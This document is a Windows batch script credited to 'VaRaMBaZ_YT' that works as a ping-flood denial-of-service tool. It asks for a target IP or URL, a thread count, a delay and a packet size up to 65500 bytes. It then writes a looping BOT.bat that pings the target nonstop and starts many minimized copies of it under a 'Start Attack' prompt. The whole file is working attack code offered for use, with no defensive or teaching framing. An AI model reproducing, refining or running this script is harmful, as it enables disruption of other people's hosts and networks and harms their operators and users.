@echo off
echo Created: VaRaMBaZ_YT
if exist "BOT.bat" Del "BOT.bat">nul
set /p ip="IP/HTTP(S): "
set /p zap="Threads: "
set /p TS="Delay send: "
set /p Frag="Use fragmentation ? (1-Yes; 2-No): "
if "%Frag%"=="1" goto :frag
if "%Frag%"=="2" goto :nofrag

:nofrag
set /p File="File weight in bytes(MAX: 1000): "
set /p Attack="Start Attack ? (1-Yes; 2-No): "
if "%Attack%"=="1" goto :nofragsendcreate
if "%Attack%"=="2" exit

:nofragsendcreate
echo @echo off>>BOT.bat
echo :botstart>>BOT.bat
echo ping -w %TS% -t -f -l %File% %ip%>>BOT.bat
echo goto botstart>>BOT.bat
goto prov


:frag
set /p File="File weight in bytes(MAX: 65500): "
set /p Attack="Start Attack ? (1-Yes; 2-No): "
if "%Attack%"=="1" goto :fragsend
if "%Attack%"=="2" exit

:fragsend
echo @echo off>>BOT.bat
echo :botstart>>BOT.bat
echo ping -w %TS% -t -l %File% %ip%>>BOT.bat
echo goto botstart>>BOT.bat
goto prov

:prov
if exist "BOT.bat" goto raz else goto prov


:raz
FOR /L %%i IN (1,1,%zap%) DO Start /MIN "BOT" BOT.bat

